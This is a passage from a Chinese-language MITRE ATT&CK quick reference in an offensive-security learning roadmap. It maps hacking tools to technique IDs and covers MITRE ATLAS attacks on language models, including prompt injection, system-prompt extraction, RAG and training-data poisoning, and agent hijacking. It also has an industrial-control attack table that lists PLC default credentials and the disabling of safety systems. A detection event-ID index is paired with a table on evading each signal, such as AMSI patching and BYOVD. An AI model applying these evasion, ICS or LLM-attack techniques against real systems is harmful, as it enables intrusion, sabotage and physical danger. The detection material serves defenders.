| Ekko / Foliage / Cronos | T1027（休眠混淆、内存加密） | 防御规避 |
| UACME | T1548.002 | 提权 |
| HEVD | T1068 | 提权（内核漏洞练习） |
| LOLDrivers (RTCore64/DBUtil) | T1543.003 + T1562.001（BYOVD） | 防御规避、提权 |
| GraphRunner | T1213.002, T1114.002, T1526 | 收集（M365） |
| MailSniper | T1114.002 | 收集（Exchange） |
| AADInternals | T1528, T1606.002, T1556 | 凭据访问（Azure） |
| ROADtools | T1528, T1087.004 | 凭据访问（Azure） |
| Coercer.py | T1187 | 凭据访问 |
| PetitPotam | T1187 | 凭据访问 |
| rclone | T1567.002, T1020 | 数据外泄 |
| Flipper Zero | T1200, T1091 | 初始访问（物理）、硬件 |
| LaZagne | T1555.003/4, T1552.001 | 凭据访问 |
| hashcat | T1110.002 | 凭据访问（离线破解） |
| AFL++ | T1587.004 | 资源开发（漏洞利用开发） |
| Ghidra / IDA Free | T1587.004、逆向工具 | 资源开发 |
| Volatility3 | T1003.001 的取证分析 | 恶意软件分析 |
| Kerbrute | T1110.003, T1558.003 | 凭据访问 |
| Coercer / DFSCoerce | T1187 | 凭据访问 |
| pywhisker | T1649（Shadow Credentials） | 凭据访问 |
| TimeroastPy | T1558.003（计算机账户变体） | 凭据访问 |
| kAFL / Nyx | T1587.004, T1211 | 资源开发（虚拟机监控程序/内核模糊测试） |
| Syzkaller | T1587.004, T1068 | 资源开发（系统调用内核模糊测试） |
| WinDbg (KDNET) | T1068, T1211 | 提权、防御规避 |
| d8 / SpiderMonkey | T1211, T1190 | 执行、防御规避（JIT 研究） |
| Proxmark3 RDV4 | T1200, T1557 | 初始访问、凭据访问（RFID/NFC） |
| HackRF One / RTL-SDR | T1557, T1001 | 初始访问、数据外泄（射频截获） |
| Chisel / WireGuard | T1090.001, T1572, T1573.001 | 命令与控制、数据外泄（隐蔽投递点） |
| MicroSIP / Linphone | T1566.004, T1598 | 初始访问、侦察（语音钓鱼/社会工程） |
| Sparrows / Lishi Decoders | T1200 | 初始访问（物理隐蔽进入） |

---

<a id="19-mitre-atlas-aiml-attack-techniques"></a>
## 19. MITRE ATLAS: AI/ML 攻击技术

> MITRE ATLAS（Adversarial Threat Landscape for AI Systems，AI 系统对抗威胁全景）是独立于 Enterprise ATT&CK 的知识库。这里列的是 ATLAS 编号，不是 Enterprise 的 T 编号。参考：https://atlas.mitre.org

ATLAS 技术适用于阶段 4F 及以后，针对 AI 驱动的应用和 ML 流水线。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/8._MITRE_ATLAS-AI-ML_Attack_Techniques.png" alt="MITRE ATLAS Techniques" width="1000"/>

</td></tr></table>
</div>

### ATLAS 技术参考

| 技术 | ATLAS ID | 正确的 Enterprise 类比 | 路线图阶段 | 说明 |
|---|---|---|---|---|
| LLM 提示注入（直接） | AML.T0051 | T1059（命令执行，并非精确对应） | 4F | 把指令直接注入 LLM 输入，覆盖系统提示词的行为 |
| LLM 提示注入（间接） | AML.T0051 | T1195（供应链注入，并非精确对应） | 4F | 检索到的文档或工具中的恶意内容导致 LLM 执行攻击者指令 |
| LLM 元提示提取 | AML.T0056 | T1552（不安全凭据的类比） | 4F | 构造查询，诱使 LLM 泄露其系统提示词与配置 |
| 训练数据投毒 | AML.T0054 | T1195.001（依赖被攻陷的类比） | 4F | 向训练集注入恶意数据，改变模型推理时的行为 |
| RAG 投毒 | AML.T0054 | T1195 | 4F | 污染向量数据库或检索索引，在查询时把攻击者内容注入 LLM 上下文 |
| 智能体劫持 | AML.T0051 + 工具滥用 | 不是 T1071（见下方说明） | 4F | 通过间接注入攻陷 LLM 智能体的工具调用链，使其执行非预期动作 |
| 通过 API 外泄模型 | AML.T0024 | T1190（API 滥用的类比） | 4F | 反复发起推理查询以提取模型权重或复现模型能力 |
| WIF / OAuth 令牌窃取 | T1528 | T1528（这就是 Enterprise ATT&CK） | 4F | 从 GCP/AWS 元数据中窃取工作负载身份联合令牌，以冒充服务账号 |
| CI/CD OIDC 令牌窃取 | T1552.004 | T1552.004（这就是 Enterprise ATT&CK） | 4H | 在流水线执行期间窃取 GitHub Actions OIDC 令牌，用于云身份冒充 |

> **修正说明（对比上一版）：** 智能体劫持此前被映射到 T1071（应用层协议）。T1071 描述的是 C2 通信协议（HTTP、DNS），与操纵 AI 智能体毫无关系。通过间接提示注入实现的智能体劫持是 ATLAS 技术，目前还没有精确的 Enterprise ATT&CK 对应项。最接近的 Enterprise 类比是 T1059（命令执行）或 T1190（利用面向公众的应用程序），但两者都无法完整描述该技术。MITRE ATLAS 才是 AI 攻击技术的正确框架。

---

<a id="20-ics-attck-quick-reference"></a>
## 20. ICS ATT&CK 速查

> ICS ATT&CK 是 MITRE 面向工业控制系统（OT/SCADA 环境）的独立矩阵。参考：https://attack.mitre.org/matrices/ics/

与阶段 4G 的 OpenPLC、Modbus、EtherNet/IP、Siemens S7 和 CAN 总线目标相关。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/9._ICS_ATT&CK_Quick_Reference.png" alt="ICS ATT&CK Quick Reference" width="300"/>

</td></tr></table>
</div>

| 技术 | ICS ATT&CK 编号 | 阶段 | 工具 / 方法 | 影响 |
|---|---|---|---|---|
| 未授权命令消息 | T0855 | 4G | pymodbus write_coil、构造 STEP 7 报文、Flipper Zero | 迫使执行器进入非预期状态 |
| 修改参数 | T0836 | 4G | Modbus FC16 写保持寄存器、EtherNet/IP 显式消息 | 改变设定值（温度、压力、流量） |
| 修改控制逻辑 | T0833 | 4G | 通过 OpenPLC Web 界面上传恶意梯形图逻辑 | 在操作员无感知的情况下隐蔽改变过程行为 |
| 远程系统信息发现 | T0888 | 4G | Nmap NSE Redpoint 脚本（s7-info、modbus-discover、enip-info） | 测绘 OT 网络拓扑与设备类型 |
| 默认凭据 | T0812 | 4G | PLC 默认口令：admin/admin、rockwell/rockwell、admin/（空） | 绕过 PLC Web 界面的认证 |
| 鱼叉钓鱼附件 | T0865 | 4G | 针对工程师工作站的钓鱼（带 Step 7 工程的 ICS 专用文档） | 获取装有 SCADA 软件的 EWS 访问权限 |
| 控制操纵 | T0831 | 4G | 向传感器读数注入虚假数据（覆盖过程值） | 在物理损坏设备的同时抑制告警 |
| 控制拒绝 | T0813 | 4G | 用非法请求淹没 Modbus（协议层 DoS） | 剥夺操作员对工业过程的合法控制 |
| 安全功能丧失 | T0837 | 4G | 禁用安全仪表系统（SIS）PLC 的响应或逻辑 | 移除防护措施，使物理损坏或人身伤害成为可能 |
| 流氓主站 | T0848 | 4G | OT 网段上由攻击者控制的 Modbus 主站（SocketCAN、pymodbus） | 冒充合法的 PLC 主站 |
| 激活固件更新模式 | T0800 | 4G | 在嵌入式设备上触发 DFU/引导程序模式以替换固件 | 在现场设备固件中植入持久化后门 |
| CAN 总线注入 | T0855（汽车 ICS 类比） | 4G | SocketCAN candump / cansend、Flipper Zero CAN 模块 | 控制或破坏汽车/嵌入式 CAN 连接系统 |
| 横向移动（OT） | T0812 + T0886 | 4G | 从历史站经由原生 SCADA 协议（Modbus、S7comm）横向跳转到 PLC | 进入更深的 OT 网段与控制系统 |

> **修正说明（对比上一版）：** CAN 总线注入此前在 MITRE 编号一栏被列为 “N/A”。工业/汽车场景下的 CAN 总线攻击对应 ICS ATT&CK 中的 **T0855**（未授权命令消息），该技术涵盖在工业通信总线上发送未授权命令。对于汽车专用的 CAN：MITRE 的 ICS ATT&CK 广泛覆盖 OT/嵌入式系统。这项技术并不是 “N/A”：视意图不同（未授权命令还是过程操纵），它对应 T0855 与 T0831。

---

<a id="21-detection-signal-index"></a>
## 21. 检测信号索引

这是防守方用来捕获每种战术的具体日志来源、事件 ID 和遥测信号的快速参考。它同时也是你的规避规划参考。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/10._Detection_Signal_Index.png" alt="Detection Signal Index" width="1400"/>

</td></tr></table>
</div>

### 关键事件 ID 参考

| 事件 ID | 日志 | 来源 | 能捕获什么 |
|---|---|---|---|
| 4624 | 安全 | DC/工作站 | 登录成功（类型 3=网络、10=RDP、9=PtH 显式、2=交互式） |
| 4625 | 安全 | DC/工作站 | 登录失败（暴力破解/密码喷洒检测的来源） |
| 4648 | 安全 | 工作站 | 显式凭据登录（runas、PtH、令牌操纵） |
| 4662 | 安全 | DC | 带权限的对象访问（DCSync：DS-Replication-Get-Changes-All GUID） |
| 4688 | 安全 | 全系统 | 带命令行的进程创建（需要“审核进程创建”与命令行策略） |
| 4698 | 安全 | 工作站 | 计划任务被创建 |
| 4720 | 安全 | DC | 用户账户被创建 |
| 4740 | 安全 | DC | 账户被锁定（密码喷洒指标：短时间大量账户） |
| 4769 | 安全 | DC | 请求 Kerberos 服务票据（RC4 类型 0x17 = Kerberoasting 指标） |
| 4768 | 安全 | DC | 请求 Kerberos TGT（AS-REP：无预认证。黄金票据：PAC 异常） |
| 4771 | 安全 | DC | Kerberos 预认证失败（AS-REP roasting 尝试指标） |
| 4776 | 安全 | DC | NTLM 认证尝试（PtH 检测、NTLM 中继来源） |
| 4886 | 安全 | ADCS | 证书被请求并签发（ADCS ESC 攻击检测） |
| 5136 | 安全 | DC | AD 对象属性被修改（Shadow Credentials：msDS-KeyCredentialLink） |
| 5140 | 安全 | 工作站 | 网络共享被访问（访问 ADMIN$、C$ = 横向移动指标） |
| 7045 | 系统 | 服务控制管理器 | 新服务被安装（BYOVD、psexec、恶意服务） |
| 1102 | 安全 | 全系统 | 审计日志被清空（T1070.001） |
| 4104 | PowerShell | 全系统 | 脚本块执行被记录（需要 GPO：打开脚本块日志） |
| 1 | Sysmon | 全系统 | 进程创建，含完整命令行、父进程、哈希 |
| 3 | Sysmon | 全系统 | 网络连接（目的 IP、端口、进程） |
| 6 | Sysmon | 全系统 | 驱动被加载（BYOVD：未签名或有漏洞的驱动） |
| 7 | Sysmon | 全系统 | 镜像（DLL）加载并做签名校验（注入 DLL、反射式加载） |
| 8 | Sysmon | 全系统 | CreateRemoteThread（进程注入检测） |
| 10 | Sysmon | 全系统 | 进程访问（读 LSASS = 凭据转储。EDR OpenProcess = 杀工具） |
| 11 | Sysmon | 全系统 | 文件创建（投放器、Web Shell、暂存归档） |
| 12/13 | Sysmon | 全系统 | 注册表对象添加/值设置（Run 键、COM 劫持、LSA 包） |
| 17/18 | Sysmon | 全系统 | 命名管道创建/连接（SMB C2 beacon） |
| 19/20/21 | Sysmon | 全系统 | WMI 过滤器/消费者/绑定被创建（WMI 持久化） |
| 22 | Sysmon | 全系统 | DNS 查询（经 DNS 的 C2 beacon、DGA 模式） |
| 25 | Sysmon | 全系统 | 进程篡改（进程镂空：内存中的镜像不匹配） |
| 28 | Sysmon | 全系统 | 剪贴板变更（剪贴板数据窃取） |

### 规避映射：从检测到绕过

| 检测信号 | 捕获的技术 | 规避思路 |
|---|---|---|
| Sysmon 10：以 PROCESS_VM_READ 打开 lsass.exe | Mimikatz、procdump 针对 lsass | nanodump（内核驱动转储）、通过卷影副本 VSS 转储、SSP 注入（不直接持有 lsass 句柄） |
| 事件 4769 RC4 服务票据（类型 0x17） | Kerberoasting | 请求 AES 票据：Rubeus kerberoast /rc4opsec（只针对支持 RC4 的账户） |
| 事件 4662 来自非 DC 的 DS-Replication-Get-Changes-All | DCSync | 改用黄金票据（工作站不产生网络 DRS 流量） |
| Sysmon 8：向目标进程 CreateRemoteThread | 标准 DLL 注入（T1055.001） | APC 注入（T1055.004）、Early Bird APC、KernelCallbackTable 注入（不用 CreateRemoteThread） |
| 事件 4104：PowerShell 上的 AMSI 扫描 | PowerShell 下载 cradle | 运行前修补 AmsiScanBuffer（T1562.001）。使用 execute-assembly 执行预编译的 .NET |
| EDR 中的 ETW 遥测空档 | ETW 补丁（T1562.006） | 通过操纵 EtwpRegistrationEntry 按提供程序禁用 ETW：比一刀切打补丁更不显眼 |
| Sysmon 7：从异常路径加载未签名 DLL | 反射式 DLL 加载、sRDI | 模块覆写（module stomping）：覆写已映射模块的节区，不触发新的 DLL 映射事件 |
| 事件 4698：计划任务被创建 | 基于任务的持久化 | COM 对象劫持（T1546.015）、WMI 订阅（T1546.003）、藏在冷门位置的 Run 键 |
| Sysmon 22：向异常域名发起的 DNS 查询突发 | DNS C2 beacon | 经合法解析器（1.1.1.1、8.8.8.8）走 DNS-over-HTTPS（DoH），绕过 DNS 日志 |
| 事件 7045：新服务被安装 | BYOVD 驱动加载、psexec | 通过已有合法服务加载驱动（劫持）、使用系统上本就存在的有漏洞驱动 |
| Sysmon 25：进程篡改（镜像不匹配） | 进程镂空 | 进程分身（T1055.013）、线程劫持（T1055.003）：不调用 NtUnmapViewOfSection |
| Sysmon 6：驱动被加载，且不是微软签名 | BYOVD 初次加载 | 使用过期/吊销 EV 证书签名的驱动（部分 EDR 在加载时不查过期）。利用无需驱动的内核写入 gadget |

---

<div align="right">

*MITRE ATT&CK 速查手册 —— The BlackHAT Roadmap v1.2.2（从 0 到 GREATEST）的一部分*<br/>
*作者：Sagar Biswas（[@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT)） · 主仓库：https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap*<br/>
*精选生态：[Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)*<br/>
*依据 Creative Commons Attribution-ShareAlike 4.0 International（CC BY-SA 4.0）许可发布*<br/>
*Enterprise 版 ATT&CK：https://attack.mitre.org | ICS 版 ATT&CK：https://attack.mitre.org/matrices/ics/ &nbsp;| ATLAS：https://atlas.mitre.org*<br/>
*投入实战前务必在 attack.mitre.org 核对技术编号：该框架每季度更新。*

</div>
